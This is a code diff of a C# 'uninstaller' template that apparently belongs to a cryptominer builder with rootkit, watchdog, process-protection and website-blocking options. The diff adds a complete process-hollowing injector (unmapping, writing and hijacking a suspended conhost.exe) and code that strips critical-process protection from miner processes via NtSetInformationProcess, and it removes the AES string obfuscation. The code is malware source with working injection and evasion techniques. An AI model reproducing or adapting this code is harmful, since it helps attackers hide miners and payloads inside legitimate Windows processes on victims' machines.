@@ -12,129 +12,87 @@ using System.Diagnostics;
 using Microsoft.Win32;
 using System.Collections.Generic;
 using System.Management;
-#if DefDebug
-using System.Windows.Forms;
-#endif
+using System.Linq;
 
 public partial class _rUninstaller_
 {
-    private static string _rbD_ = Path.Combine(Environment.GetFolderPath($LIBSROOT), "#LIBSPATH");
-    private static string _rbD2_ = Path.Combine(Environment.GetFolderPath($LIBSROOT), "#WATCHDOGPATH");
-
+    private static string libsPath = Path.Combine(Environment.GetFolderPath($CSLIBSROOT), "Google\\Libs\\");
 
     private static void Main()
     {
 #if DefRootkit
         try
         {
-            using (var _rarchive_ = new ZipArchive(new MemoryStream(_rGetTheResource_("#RES_rootkit_u"))))
+            using (var archive = new ZipArchive(new MemoryStream(GetTheResource("rootkit_u"))))
             {
-                foreach (ZipArchiveEntry _rentry_ in _rarchive_.Entries)
+                foreach (ZipArchiveEntry entry in archive.Entries)
                 {
-                    if (_rentry_.FullName.Contains("st"))
+                    if (entry.FullName.Contains("st"))
                     {
-                        using (var _rstreamdata_ = _rentry_.Open())
+                        using (var streamdata = entry.Open())
                         {
-                            using (var _rms_ = new MemoryStream())
+                            using (var ms = new MemoryStream())
                             {
-                                _rstreamdata_.CopyTo(_rms_);
-                                _rInject_(_rms_.ToArray(), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, "#CONHOST"), "", false);
+                                streamdata.CopyTo(ms);
+                                Inject(ms.ToArray(), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, "System32\\conhost.exe"), "");
                             }
                         }
                     }
                 }
             }  
         }
-#if !DefDebug
         catch { }
-#else
-        catch (Exception ex)
-        {
-            MessageBox.Show("URE: " + Environment.NewLine + ex.ToString());
-        }
-#endif
 #endif
 
-#if DefInstall
+#if DefStartup
         try
         {
-            foreach (Process proc in Process.GetProcessesByName("#WATCHDOGNAME"))
-            {
-                proc.Kill();
-            }
-        }
-#if !DefDebug
-        catch { }
-#else
-        catch (Exception ex)
-        {
-            MessageBox.Show("GWE: " + Environment.NewLine + ex.ToString());
-        }
-#endif
-
-        try
-        {
-            _rCommand_("#SCMD", "#REGREM");
+            Command("cmd", "#REGREM");
 
         }
         catch {}
 
         try
         {
-            _rCommand_("#SCMD", "#TASKSCHREM");
+            Command("cmd", "#TASKSCHREM");
         }
-#if !DefDebug
         catch { }
-#else
-        catch (Exception ex)
-        {
-            MessageBox.Show("TRE: " + Environment.NewLine + ex.ToString());
-        }
-#endif
-
 #endif
 
         try
         {
-            List<int> _rpids_ = new List<int> { };
+            List<int> pids = new List<int> { };
             var _rarg1_ = new ConnectionOptions();
             _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
-            var _rarg2_ = new ManagementScope("#WMISCOPE", _rarg1_);
+            var _rarg2_ = new ManagementScope("\\root\\cimv2", _rarg1_);
             _rarg2_.Connect();
 
-            var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery("#WATCHDOGQUERY")).Get();
+            var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery("Select CommandLine, ProcessID from Win32_Process")).Get();
+            string[] minerset = new string[] { $FINDSET };
             foreach (ManagementObject MemObj in _rarg3_)
             {
-                if (MemObj != null && MemObj["#STRCMDLINE"] != null && (MemObj["#STRCMDLINE"].ToString().Contains("#MINERID") || MemObj["#STRCMDLINE"].ToString().Contains("#WATCHDOGID")))
+                if (MemObj != null && MemObj["CommandLine"] != null && (minerset.Any(MemObj["CommandLine"].ToString().Contains) || MemObj["CommandLine"].ToString().Contains(" #WATCHDOGID")))
                 {
-                    _rpids_.Add(Convert.ToInt32(MemObj["#STRPROCID"]));
+                    pids.Add(Convert.ToInt32(MemObj["ProcessID"]));
                 }
             }
 
 #if DefProcessProtect
-            _rUnProtect_(_rpids_.ToArray());
+            UnProtect(pids.ToArray());
 #endif
             
-            foreach(int _rpid_ in _rpids_)
+            foreach(int pid in pids)
             {
-                _rCommand_("#SCMD", string.Format("#CMDKILL", _rpid_));
+                Command("cmd", string.Format("/c taskkill /f /PID \"{0}\"", pid));
             }
         }
-#if !DefDebug
         catch { }
-#else
-        catch (Exception ex)
-        {
-            MessageBox.Show("KPE: " + Environment.NewLine + ex.ToString());
-        }
-#endif
 
         Thread.Sleep(3000);
         try
         {
-            Directory.Delete(_rbD_, true);
-            Directory.Delete(_rbD2_, true);
-#if DefInstall
+            Directory.Delete(libsPath, true);
+#if DefStartup
             File.Delete(PayloadPath);
 #endif
         }
@@ -143,67 +101,29 @@ public partial class _rUninstaller_
 #if DefBlockWebsites
         try
         {
-            string _rhostspath_ = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "#HOSTSPATH");
-            List<string> _rhostscontent_ = new List<string>(File.ReadAllLines(_rhostspath_));
+            string hostspath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers/etc/hosts");
+            List<string> hostscontent = new List<string>(File.ReadAllLines(hostspath));
 
-            string[] _rdomainset_ = new string[] { DOMAINSET };
-            for (int i = _rhostscontent_.Count - 1; i >= 0; i--)
+            string[] domainset = new string[] { $CSDOMAINSET };
+            for (int i = hostscontent.Count - 1; i >= 0; i--)
             {
-                foreach (string _rset_ in _rdomainset_)
+                foreach (string set in domainset)
                 {
-                    string _rcur_ = _rGetString_(_rset_);
-                    if (_rhostscontent_[i].Contains(" " + _rcur_))
+                    if (hostscontent[i].Contains(set))
                     {
-                        _rhostscontent_.RemoveAt(i);
+                        hostscontent.RemoveAt(i);
                         break;
                     }
                 }
             }
-            File.WriteAllLines(_rhostspath_, _rhostscontent_.ToArray());
+            File.WriteAllLines(hostspath, hostscontent.ToArray());
         }
-#if !DefDebug
         catch { }
-#else
-        catch (Exception ex)
-        {
-            MessageBox.Show("BWE: " + Environment.NewLine + ex.ToString());
-        }
-#endif
 #endif
         Environment.Exit(0);
     }
 
-    private static string _rGetString_(string _rarg1_)
-    {
-#if DefObfuscate
-        return Encoding.UTF8.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
-#else
-        return _rarg1_;
-#endif
-    }
-
-    private static byte[] _rAESMethod_(byte[] _rinput_, bool _rencrypt_ = false)
-    {
-#if DefObfuscate
-        var _rkeybytes_ = new Rfc2898DeriveBytes(@"#AESKEY", Encoding.ASCII.GetBytes(@"#SALT"), 100).GetBytes(16);
-        using (Aes _raesAlg_ = Aes.Create())
-        {
-            using (MemoryStream _rmsDecrypt_ = new MemoryStream())
-            {
-                using (CryptoStream _rcsDecrypt_ = new CryptoStream(_rmsDecrypt_, _rencrypt_ ? _raesAlg_.CreateEncryptor(_rkeybytes_, Encoding.ASCII.GetBytes(@"#IV")) : _raesAlg_.CreateDecryptor(_rkeybytes_, Encoding.ASCII.GetBytes(@"#IV")), CryptoStreamMode.Write))
-                {
-                    _rcsDecrypt_.Write(_rinput_, 0, _rinput_.Length);
-                    _rcsDecrypt_.Close();
-                }
-                return _rmsDecrypt_.ToArray();
-            }
-        }
-#else
-        return _rinput_;
-#endif
-    }
-
-    private static void _rCommand_(string _rarg1_, string _rarg2_)
+    private static void Command(string _rarg1_, string _rarg2_)
     {
         try
         {
@@ -216,74 +136,156 @@ public partial class _rUninstaller_
                 CreateNoWindow = true
             });
         }
-#if !DefDebug
         catch { }
-#else
-        catch (Exception ex)
-        {
-            MessageBox.Show("RCE: " + Environment.NewLine + ex.ToString());
-        }
-#endif
     }
 
-#if DefRootkit || DefProcessProtect
-    private static byte[] _rGetTheResource_(string _rarg1_)
+#if DefRootkit
+    private static byte[] GetTheResource(string resid)
     {
-        var MyResource = new System.Resources.ResourceManager("#RES_parent", Assembly.GetExecutingAssembly());
-        return _rAESMethod_((byte[])MyResource.GetObject(_rarg1_));
+        var MyResource = new System.Resources.ResourceManager("uninstaller", Assembly.GetExecutingAssembly());
+        return (byte[])MyResource.GetObject(resid);
     }
-    
-        private static int _rInject_(byte[] _rpayload_, string _rinjectionpath_, string _rarguments_, bool _rshellcode_)
+
+    [DllImport("kernel32.dll")]
+    private static extern bool CreateProcess(string lpApplicationName,
+                                         string lpCommandLine,
+                                         IntPtr lpProcessAttributes,
+                                         IntPtr lpThreadAttributes,
+                                         bool bInheritHandles,
+                                         uint dwCreationFlags,
+                                         IntPtr lpEnvironment,
+                                         string lpCurrentDirectory,
+                                         byte[] lpStartupInfo,
+                                         byte[] lpProcessInformation);
+
+    [DllImport("kernel32.dll")]
+    private static extern long VirtualAllocEx(long hProcess,
+                                              long lpAddress,
+                                              long dwSize,
+                                              uint flAllocationType,
+                                              uint flProtect);
+
+    [DllImport("kernel32.dll")]
+    private static extern long WriteProcessMemory(long hProcess,
+                                                  long lpBaseAddress,
+                                                  byte[] lpBuffer,
+                                                  int nSize,
+                                                  long written);
+
+    [DllImport("ntdll.dll")]
+    private static extern uint ZwUnmapViewOfSection(long ProcessHandle,
+                                                    long BaseAddress);
+
+    [DllImport("kernel32.dll")]
+    public static extern uint CreateRemoteThread(long hProcess,
+                                                IntPtr lpThreadAttributes,
+                                                uint dwStackSize,
+                                                long lpStartAddress,
+                                                long lpParameter,
+                                                uint dwCreationFlags,
+                                                out IntPtr lpThreadId);
+
+    [DllImport("kernel32.dll")]
+    private static extern bool SetThreadContext(long hThread,
+                                                IntPtr lpContext);
+
+    [DllImport("kernel32.dll")]
+    private static extern bool GetThreadContext(long hThread,
+                                                IntPtr lpContext);
+
+    [DllImport("kernel32.dll")]
+    private static extern uint ResumeThread(long hThread);
+
+    [DllImport("kernel32.dll")]
+    private static extern bool CloseHandle(long handle);
+
+
+    private static void Inject(byte[] payload, string injectionpath, string arguments)
     {
         try
         {
-            return _rDllLoader_("#DLLLOADMETHOD", new object[] { _rGetTheResource_("#RES_processinject"), "#INJECTMETHOD", _rpayload_, _rinjectionpath_, _rarguments_, _rshellcode_ });
+            int e_lfanew = Marshal.ReadInt32(payload, 0x3c);
+            int sizeOfImage = Marshal.ReadInt32(payload, e_lfanew + 0x18 + 0x038);
+            int sizeOfHeaders = Marshal.ReadInt32(payload, e_lfanew + 0x18 + 0x03c);
+            int entryPoint = Marshal.ReadInt32(payload, e_lfanew + 0x18 + 0x10);
+
+            short numberOfSections = Marshal.ReadInt16(payload, e_lfanew + 0x4 + 0x2);
+            short sizeOfOptionalHeader = Marshal.ReadInt16(payload, e_lfanew + 0x4 + 0x10);
+
+            long imageBase = Marshal.ReadInt64(payload, e_lfanew + 0x18 + 0x18);
+
+            byte[] bStartupInfo = new byte[0x68];
+            byte[] bProcessInfo = new byte[0x18];
+
+            IntPtr pThreadContext = new IntPtr(16 * ((Marshal.AllocHGlobal(0x4d0 + (16 / 2)).ToInt64() + (16 - 1)) / 16));
+
+            Marshal.WriteInt32(pThreadContext, 0x30, 0x0010001b);
+
+            CreateProcess(null, injectionpath + (!string.IsNullOrEmpty(arguments) ? " " + arguments : ""), IntPtr.Zero, IntPtr.Zero, true, 0x4u, IntPtr.Zero, Path.GetDirectoryName(injectionpath), bStartupInfo, bProcessInfo);
+            long processHandle = Marshal.ReadInt64(bProcessInfo, 0x0);
+            long threadHandle = Marshal.ReadInt64(bProcessInfo, 0x8);
+
+            ZwUnmapViewOfSection(processHandle, imageBase);
+            VirtualAllocEx(processHandle, imageBase, sizeOfImage, 0x3000, 0x40);
+            WriteProcessMemory(processHandle, imageBase, payload, sizeOfHeaders, 0L);
+
+            for (short i = 0; i < numberOfSections; i++)
+            {
+                byte[] section = new byte[0x28];
+                Buffer.BlockCopy(payload, e_lfanew + (0x18 + sizeOfOptionalHeader) + (0x28 * i), section, 0, 0x28);
+
+                int virtualAddress = Marshal.ReadInt32(section, 0x00c);
+                int sizeOfRawData = Marshal.ReadInt32(section, 0x010);
+                int pointerToRawData = Marshal.ReadInt32(section, 0x014);
+
+                byte[] bRawData = new byte[sizeOfRawData];
+                Buffer.BlockCopy(payload, pointerToRawData, bRawData, 0, bRawData.Length);
+
+                WriteProcessMemory(processHandle, imageBase + virtualAddress, bRawData, bRawData.Length, 0L);
+            }
+
+            GetThreadContext(threadHandle, pThreadContext);
+
+            byte[] bImageBase = BitConverter.GetBytes(imageBase);
+
+            long rdx = Marshal.ReadInt64(pThreadContext, 0x88);
+            WriteProcessMemory(processHandle, rdx + 16, bImageBase, 8, 0L);
+
+            Marshal.WriteInt64(pThreadContext, 0x80, imageBase + entryPoint);
+
+            SetThreadContext(threadHandle, pThreadContext);
+            ResumeThread(threadHandle);
+
+            Marshal.FreeHGlobal(pThreadContext);
+            CloseHandle(processHandle);
+            CloseHandle(threadHandle);
+            
         }
-#if !DefDebug
         catch { }
-#else
-        catch (Exception ex)
-        {
-            MessageBox.Show("PIE: " + Environment.NewLine + ex.ToString());
-        }
-#endif
-        return 0;
     }
+#endif
 
 #if DefProcessProtect
-    private static int _rUnProtect_(int[] _rpids_)
-    {
-        try
-        {
-            return _rDllLoader_("#DLLPROTECTMETHOD", new object[] { _rGetTheResource_("#RES_processprotect"), "#PROTECTMETHOD", _rpids_, false });
-        }
-#if !DefDebug
-        catch { }
-#else
-        catch (Exception ex)
-        {
-            MessageBox.Show("PPI: " + Environment.NewLine + ex.ToString());
-        }
-#endif
-        return 0;
-    }
-#endif
+    [DllImport("ntdll.dll", SetLastError = true)]
+    private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
 
-    private static int _rDllLoader_(string _rmethod_, object[] _rarguments_)
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+    private static void UnProtect(int[] pids)
     {
         try
         {
-            return (int)Assembly.Load(_rGetTheResource_("#RES_dllloader")).GetType("#DLLLOADERTYPE").GetMethod(_rmethod_, BindingFlags.Public | BindingFlags.Static).Invoke(null, _rarguments_);
+            Process.EnterDebugMode();
+
+            foreach(int pid in pids)
+            {
+                int isCritical = 0;
+                int BreakOnTermination = 0x1D;
+                NtSetInformationProcess(OpenProcess(0x001F0FFF, false, pid), BreakOnTermination, ref isCritical, sizeof(int));
+            }
         }
-#if !DefDebug
         catch { }
-#else
-        catch (Exception ex)
-        {
-            MessageBox.Show("DLE: " + Environment.NewLine + ex.ToString());
-        }
-#endif
-        return 0;
     }
 #endif
 }
